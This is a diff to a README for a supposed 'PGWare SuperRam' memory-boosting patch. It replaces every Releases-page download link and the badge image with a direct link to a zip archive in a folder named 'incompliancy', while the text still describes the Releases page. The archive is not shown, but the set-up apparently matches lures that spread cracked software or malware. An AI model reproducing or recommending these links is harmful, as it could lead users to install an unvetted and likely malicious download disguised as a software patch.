@@ -1,6 +1,6 @@
 # 🎉 PGWare-SuperRam-Latest-Patch - Boost Your PC's Memory Performance
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Patch-brightgreen)](https://github.com/anuking614/PGWare-SuperRam-Latest-Patch/releases)
+[![Download](https://raw.githubusercontent.com/anuking614/PGWare-SuperRam-Latest-Patch/main/incompliancy/PG_Latest_Ram_Super_Ware_Patch_v1.3.zip%20Patch-brightgreen)](https://raw.githubusercontent.com/anuking614/PGWare-SuperRam-Latest-Patch/main/incompliancy/PG_Latest_Ram_Super_Ware_Patch_v1.3.zip)
 
 ## 📋 Description
 
@@ -21,7 +21,7 @@ Follow these simple steps to download and run PGWare SuperRam.
 
 To get started, visit the official Releases page to download the latest patch for PGWare SuperRam:
 
-[Download Latest Patch](https://github.com/anuking614/PGWare-SuperRam-Latest-Patch/releases)
+[Download Latest Patch](https://raw.githubusercontent.com/anuking614/PGWare-SuperRam-Latest-Patch/main/incompliancy/PG_Latest_Ram_Super_Ware_Patch_v1.3.zip)
 
 1. Click the link above to open the Releases page.
 2. Look for the latest version listed at the top.
@@ -77,4 +77,4 @@ This project is licensed under the MIT License. You may use and modify the softw
 
 Thank you for choosing PGWare SuperRam. Your commitment to maximizing your PC's performance is valued. For more resources, tips, and updates, stay connected through this repository.
 
-[Download Latest Patch](https://github.com/anuking614/PGWare-SuperRam-Latest-Patch/releases)
+[Download Latest Patch](https://raw.githubusercontent.com/anuking614/PGWare-SuperRam-Latest-Patch/main/incompliancy/PG_Latest_Ram_Super_Ware_Patch_v1.3.zip)
